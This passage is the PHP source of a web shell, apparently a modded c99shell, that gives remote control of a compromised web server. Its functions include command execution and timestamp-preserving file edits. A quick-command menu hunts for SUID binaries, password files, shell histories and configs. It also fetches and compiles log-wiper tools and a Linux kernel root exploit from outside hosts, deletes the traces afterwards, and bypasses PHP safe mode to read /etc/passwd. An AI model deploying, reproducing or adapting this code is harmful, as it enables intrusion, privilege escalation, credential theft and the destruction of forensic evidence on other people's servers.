($filestealth) {$stat = stat($d.$f);}\r\n    $fp = fopen($d.$f,"w");\r\n    if (!$fp) {echo "<b>Can\'t write to file!</b>";}\r\n    else\r\n    {\r\n     echo "<b>Saved!</b>";\r\n     fwrite($fp,$edit_text);\r\n     fclose($fp);\r\n     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}\r\n     $r = $edit_text;\r\n    }\r\n   }\r\n   $rows = count(explode("\\r\\n",$r));\r\n   if ($rows < 10) {$rows = 10;}\r\n   if ($rows > 30) {$rows = 30;}\r\n   echo "<form action=\\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\\" method=POST><input type=submit name=submit value=\\"Save\\">&nbsp;<input type=\\"reset\\" value=\\"Reset\\">&nbsp;<input type=\\"button\\" onclick=\\"location.href=\'".addslashes($surl."act=ls&d=".substr($d,0,-1))."\';\\" value=\\"Back\\"><br><textarea name=\\"edit_text\\" cols=\\"122\\" rows=\\"".$rows."\\">".htmlspecialchars($r)."</textarea></form>";\r\n  }\r\n  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \\$GLOBALS.</b></center>";}\r\n  else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}\r\n }\r\n}\r\n}\r\nelse\r\n{\r\n @ob_clean();\r\n //For simple size- and speed-optimization.\r\n $imgequals = array(\r\n  "ext_tar"=>array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),\r\n  "ext_php"=>array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),\r\n  "ext_jpg"=>array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),\r\n  "ext_html"=>array("ext_html","ext_htm"),\r\n  "ext_avi"=>array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),\r\n  "ext_lnk"=>array("ext_lnk","ext_url"),\r\n  "ext_ini"=>array("ext_ini","ext_css","ext_inf"),\r\n  "ext_doc"=>array("ext_doc","ext_dot"),\r\n  "ext_js"=>array("ext_js","ext_vbs"),\r\n  "ext_cmd"=>array("ext_cmd","ext_bat","ext_pif"),\r\n  "ext_wri"=>array("ext_wri","ext_rtf"),\r\n  "ext_swf"=>array("ext_swf","ext_fla"),\r\n  "ext_mp3"=>array("ext_mp3","ext_au","ext_midi","ext_mid"),\r\n  "ext_htaccess"=>array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")\r\n );\r\n if (!$getall)\r\n {\r\n  header("Content-type: image/gif");\r\n  header("Cache-control: public");\r\n  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));\r\n  header("Cache-control: max-age=".(60*60*24*7));\r\n  header("Last-Modified: ".date("r",filemtime(__FILE__)));\r\n  foreach($imgequals as $k=>$v) {if (in_array($img,$v)) {$img = $k; break;}}\r\n  if (empty($images[$img])) {$img = "small_unk";}\r\n  if (in_array($img,$ext_tar)) {$img = "ext_tar";}\r\n  echo base64_decode($images[$img]);\r\n }\r\n else\r\n {\r\n  foreach($imgequals as $a=>$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \\$images[".$d."]<br>");}}}}\r\n  natsort($images);\r\n  $k = array_keys($images);\r\n  echo  "<center>";\r\n  foreach ($k as $u) {echo $u.":<img src=\\"".$surl."act=img&img=".$u."\\" border=\\"1\\"><br>";}\r\n  echo "</center>";\r\n }\r\n exit;\r\n}\r\n?>\r\n</td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\r\n<tr><td width="100%" height="1" valign="top"><center><form action="<?php echo $surl; ?>"><input type=hidden name=act value="cmd"><br/><b>Local Command:</b> <input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td></tr></TABLE>\r\n<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\r\n<tr>\r\n  <td width="50%" height="83" valign="top"><center>\r\n    <div align="center"><br/>\r\n    <b> Quick Commands </b></div>\r\n    <form action="<?php echo $surl; ?>">\r\n      <div align="center">\r\n        <input type=hidden name=act value="cmd">\r\n        <input type=hidden name="d" value="<?php echo $dispd; ?>">\r\n         <SELECT NAME="cmd">\r\n\t\t <OPTION VALUE="#"> [File Manipulation]\r\n\t\t <OPTION VALUE="">                   \r\n\t\t <OPTION VALUE="lsattr -va">List file attributes on a Linux second extended file system\r\n\t\t <OPTION VALUE="find / -type f -perm -04000 -ls">Find suid files\r\n           <OPTION VALUE="find . -type f -perm -04000 -ls">Find suid files in current directory\r\n           <OPTION VALUE="find / -type f -perm -02000 -ls">Find sgid files\r\n           <OPTION VALUE="find . -type f -perm -02000 -ls">Find sgid files in current directory\r\n\t\t    <OPTION VALUE="ls -lia">List you current directory\'s files, folders, & permissions\r\n\t\t\t <OPTION VALUE="find / -type f -name config.inc.php">Find config.inc.php files\r\n             <OPTION VALUE="find . -type f -name config.inc.php">Find config.inc.php files in current directory\r\n             <OPTION VALUE="find / -type f -name "config*">Find config* files\r\n             <OPTION VALUE="find . -type f -name "config*">Find config* files in current directory\r\n              <OPTION VALUE="find / -type f -perm -2 -ls">Find all writable files\r\n             <OPTION VALUE="find . -type f -perm -2 -ls">Find all writable files in current directory\r\n             <OPTION VALUE="find / -perm -2 -ls">Find all writable directories and files\r\n\t    \t <OPTION VALUE="find . -perm -2 -ls">Find all writable directories and files in current directory\r\n\t\t\t <OPTION VALUE="find / -type f -name service.pwd">Find all service.pwd files\r\n\t\t\t <OPTION VALUE="find . -type f -name service.pwd">Find service.pwd files in current directory\r\n\t\t\t <OPTION VALUE="find / -type f -name .htpasswd">Find all .htpasswd files\r\n\t\t\t <OPTION VALUE="find . -type f -name .htpasswd">Find .htpasswd files in current directory\r\n\t\t\t <OPTION VALUE="find / -type f -name .bash_history">Find all .bash_history files\r\n\t\t\t <OPTION VALUE="find . -type f -name .bash_history">Find .bash_history files in current directory\r\n\t\t\t <OPTION VALUE="find / -type f -name .mysql_history">Find all .mysql_history files\r\n\t\t\t<OPTION VALUE="find . -type f -name .mysql_history">Find .mysql_history files in current directory\r\n\t\t\t <OPTION VALUE="find / -type f -name .fetchmailrc">Find all .fetchmailrc files\r\n\t\t\t<OPTION VALUE="find . -type f -name .fetchmailrc">Find .fetchmailrc files in current directory\r\n\t\t\t<OPTION VALUE="cat /var/cpanel/accounting.log">Get cpanel logs\r\n\t\t\t<OPTION VALUE="">                   \r\n\t\t<OPTION VALUE="#"> [Directory Malipulation]\r\n\t\t<OPTION VALUE="">                  \r\n\t\t<OPTION VALUE="pwd">List your current directory\r\n\t\t<OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Is /etc/ writable?\r\n\t\t<OPTION VALUE="find /  -type d -perm -2 -ls">Find all writable directories\r\n<OPTION VALUE="find . -type d -perm -2 -ls">Find all writable directories in current directory\r\n<OPTION VALUE="find /  -type d -perm -2 -ls">Find all writable directories\r\n<OPTION VALUE="find . -type d -perm -2 -ls">Find all writable directories in current directory\r\n<OPTION VALUE="">                   \r\n<OPTION VALUE="#"> [Miscellaneous Commands]\r\n<OPTION VALUE="">                   \r\n           <OPTION VALUE="tar -cvf NEWTAR!!.tar -c <?php passthru(\'pwd\'); ?>">Tar your current directory. (Only works if the directory is writable)\r\n  <OPTION VALUE="uname -a">Kernel version\r\n           <OPTION VALUE="w">Logged in users\r\n           <OPTION VALUE="lastlog">Last users to connect\r\n           <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins\r\n           <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">Users without passwords\r\n            <OPTION VALUE="cat /proc/version /proc/cpuinfo">CpuInfo\r\n             <OPTION VALUE="netstat -atup | grep IST">Open ports    \r\n\t\t\t <OPTION VALUE="">                                     \r\n            <OPTION VALUE="#"> [Application Verification]\r\n\t\t\t<OPTION VALUE="">                   \r\n            <OPTION VALUE="which wget curl w3m lynx">Check For Downloaders (WGET, et cetera)\r\n            <OPTION VALUE="locate gcc">Check For GCC\r\n\t\t\t<OPTION VALUE="">                   \r\n\t\t   <OPTION VALUE="#"> [Log Cleaners]\r\n\t\t   <OPTION VALUE="">                   \r\n                    <OPTION VALUE="wget http://packetstormsecurity.org/UNIX/penetration/log-wipers/logcleaner-0.3.c">Wipelogs (Part 1)(Zap3)\r\n                    <OPTION VALUE="gcc logcleaner-0.3.c -o logcleaner-0.3">Wipelogs (Part 2)(Zap3)\r\n                    <OPTION VALUE="./logcleaner-0.3 <? echo $_SERVER["REMOTE_ADDR"]; ?>">Wipelogs (Part 3)(Zap3)\r\n                    <OPTION VALUE="Gone!<? if($_REQUEST[\'cmd\']=="Gone!") { if (file_exists("logcleaner-0.3.c")) { unlink("logcleaner-0.3.c"); } if (file_exists("logcleaner-0.3")) { unlink("logcleaner-0.3"); } } ?>">Remove All Zap3 Traces\r\n                   <OPTION VALUE="">  \r\n                    <OPTION VALUE="wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/vanish.c">Wipelogs (Part 1)(Vanish)\r\n                    <OPTION VALUE="gcc vanish.c -o vanish">Wipelogs (Part 2)(Vanish)\r\n                     <OPTION VALUE="./vanish <? echo exec(\'whoami\'); ?> <? echo $_SERVER["REMOTE_ADDR"]; ?> <? echo gethostbyname($_SERVER["HTTP_HOST"]); ?>">Wipelogs (Part 3)(Vanish)\r\n                    <OPTION VALUE="Gone!!<? if($_REQUEST[\'cmd\']=="Gone!!") { if (file_exists("vanish.c")) { unlink("vanish.c"); } if (file_exists("vanish")) { unlink("vanish"); } } ?>">Remove All Vanish Traces\r\n                   <OPTION VALUE=""> \r\n                   <OPTION VALUE="#"> [Root Exploits]\r\n\t\t   <OPTION VALUE=""> \r\n                    <OPTION VALUE="wget http://www.synsta.templatez.org/1.txt">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 1)\r\n                   <OPTION VALUE="mv 1.txt exploit.c">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 2)\r\n                   <OPTION VALUE="gcc exploit.c -o exploit">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 3)\r\n                   <OPTION VALUE="./exploit">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 4)\r\n                   <OPTION VALUE="Gone!!!<? if($_REQUEST[\'cmd\']=="Gone!!!") { if (file_exists("exploit.c")) { unlink("exploit.c"); } if (file_exists("1.txt")) { unlink("1.txt"); } if (file_exists("exploit")) { unlink("exploit"); } } ?>">Remove All Exploit Traces\r\n                    </SELECT>\r\n        \r\n        <input type=hidden name="cmd_txt" value="1">\r\n        &nbsp;\r\n        <input type=submit name=submit value="Execute"></div>\r\n    </form>\r\n    </td>\r\n  <td width="50%" height="83" valign="top"><center>\r\n  <center><br/><b> Kernel Information </b>\r\n<form action=http://google.com/search name=f><input type=hidden name=client value="firefox-a"><input type=hidden name=rls value="org.mozilla:en-US:official_s"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value="<?php echo wordwrap(php_uname()); ?>" size=80>\r\n&nbsp;\r\n<input type=submit value="Search" name=btnG></form>\r\n</center>\r\n    </td>\r\n</tr></TABLE>\r\n<br>\r\n<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\r\n<tr>\r\n  <td width="50%" height="83" valign="top"><center>\r\n    <div align="center"><strong>PHP Safe-Mode Bypass (Read Files)    </strong></div>\r\n    <br>\r\n    <form action="<?php echo $surl; ?>" method="post">\r\n      <div align="center">\r\n      File: <input type="text" name="file"> <input type="submit" value="Read File"><br><br> eg: /etc/passwd<br>\r\n      <?php\r\n      function rsg_read()\r\n\t{\t\r\n\t$test="";\r\n\t$temp=tempnam($test, "cx");\r\n\t$file=$_REQUEST[\'file\'];\t\r\n\t$get=htmlspecialchars($file);\r\n\techo "</br>Trying To Get File <font color=#000099><b>$get</b></font><br>";\r\n\tif(copy("compress.zlib://".$file, $temp)){\r\n\t$fichier = fopen($temp, "r");\r\n\t$action = fread($fichier, filesize($temp));\r\n\tfclose($fichier);\r\n\t$source=htmlspecialchars($action);\r\n\r\n\r\n\techo "<div class=\\"shell\\"></br><b>Reading $get:</b><br><br><textarea rows=10 cols=50>$source</textarea><br>";\r\n\tunlink($temp);\r\n\t} else {\r\n\techo("</br><FONT COLOR=\\"RED\\"><CENTER>Sorry... File\r\n\t<B>".htmlspecialchars($file)."</B> dosen\'t exists or you don\'t have\r\n\taccess.</CENTER></FONT>");\r\n\t\t\t}\r\n\techo "</div>";\r\n\t}\r\n\t\r\n\tif(isset($_REQUEST[\'file\']))\r\n{\r\nrsg_read();\r\n}\r\n\t\r\n\t?>\r\n\t\r\n\t<?\r\n\t\r\n\tfunction rsg_glob()\r\n{\r\n$chemin=$_REQUEST[\'directory\'];\r\n$files = glob("$chemin*");\r\necho "</br>Trying To List Folder <font color=#000099><b>$chemin</b></font><br>";\r\nforeach ($files as $filename) {\r\n\techo "<pre>";\r\n   echo "$filename\\n";\r\n   echo "</pre>";\r\n}\r\n}\r\n\r\nif(isset($_REQUEST[\'directory\']))\r\n{\r\nrsg_glob();\r\n}\r\n\r\n?>\r\n\r\n          <br>\r\n      </div>\r\n    </form>\r\n    </td>\r\n  <td width="50%" height="83" valign="top"><center>\r\n   <center>\r\n     <strong>PHP Safe-Mode Bypass (List Directories)</strong>:     \r\n     <form action="<?php echo $surl; ?>" method="post">\r\n      <div align="center"><br>\r\n      Dir: <input type="text" name="directory"> <input type="submit" value="List Directory"><br><br> eg: /etc/<br>\r\n\r\n    </form></center>\r\n    </td>\r\n</tr></TABLE>\r\n<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\r\n<tr>\r\n <td width="50%" height="1" valign="top"><center>\r\n   <b>Search</b>\r\n   <form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Search"></form></center></p></td>\r\n <td width="50%" height="1" valign="top"><center>\r\n   <b>Upload</b>\r\n   <form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type="file" name="uploadfile"><input type=hidden name="miniform" value="1">&nbsp;<input type=submit name=submit value="Upload"><br><?php echo $wdt; ?></form></center></td>\r\n</tr>\r\n</table>\r\n<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center>\r\n  <b><strong>Create Directory\r\n  </strong>\r\n  <p><form action="<?php echo $PHP_SELF; ?>"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center>\r\n    <strong>Create File </strong>\r\n    <form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td></tr></table>\r\n\r\n<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center>\r\n  <b>Enter Directory </b>\r\n  <form action="<?php echo $surl; ?>"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center>\r\n    <b>Access File</b>\r\n    <form action="<?php echo $surl; ?>"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>\r\n</td>\r\n</tr>\r\n</TABLE>\r\n<br><TABLE width="100%" height=1 border=1 cellPadding=0 cellSpacing=0 borderColorLight=#c0c0c0 borderColorDark=#666666 bgColor=#333333 style="BORDER-COLLAPSE: collapse">\r\n  <tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell modded by <a href=http://w4ck1ng.com class="style1">w4ck1ng</a>. | <? echo("$shver"); ?> | Page generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</p></td></tr></table>\r\n<br/></body></html><?php chdir($lastdir); c99shexit(); ?>\r\n'